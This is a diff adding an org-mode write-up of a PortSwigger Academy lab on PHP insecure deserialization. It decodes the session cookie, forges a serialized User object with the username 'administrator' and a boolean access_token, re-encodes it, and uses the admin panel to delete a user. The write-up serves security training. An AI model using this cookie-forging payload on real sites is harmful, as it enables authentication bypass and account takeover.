@@ -1,0 +1,62 @@
+#+title:  Modifying serialized data types
+#+description: another portswigger academy lab
+
+* Lab
+
+https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types
+
+- Credentials
+  wiener:peter
+
+This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result.
+
+To solve this lab edit the serializsed object in the sessions cookie to access the admin account
+
+With admin account delete the ~carlos~ user
+
+* # Issue
+
+As the same case of the last lab, the cookie are base64 encoded, and the cookie are an serialized object, which is a big problem in security terms.
+
+CTRL + SHITF + i to open ~dev tools~ ->
+
+        Application > Storage > Cookie
+
+- Get the cookie and decode ->
+#+begin_src sh
+echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJienc4azlhM2N0dmpqYWluNG91ZXg5ZGoydHM4djloYiI7fQ==' | base64 -d
+  #+end_src
+
+and another object deserialized ->
+
+#+begin_src sh
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bzw8k9a3ctvjjain4ouex9dj2ts8v9hb";}
+#+end_src
+
+The type of the contents are s (String), what happens with we modify the data type from S to B (Bool) ?
+
+At this case we modfy the "username" value to admin and the "access_token" value type to bool ->
+
+#+begin_src sh
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
+#+end_src
+
+Now encode again with base64 and set to the new cookie value at web page ->
+
+#+begin_src sh
+echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}' | base64 -w 0
+#+end_src
+
+~base64 -w 0~  = Use 0 to disable line wrapping
+
+Copy the result and put at new cookie value at web page with ~dev tools~
+
+#+begin_src
+CTRL + SHIFT + i
+
+Application > Storage > Cookie
+#+END_SRC
+
+ Reload the page with the new cookie defined, and now we are logged in as administrator user, we can confirm that with My account tab, where your current username is displayed
+
+ - At Admin Panel delet the carlos account
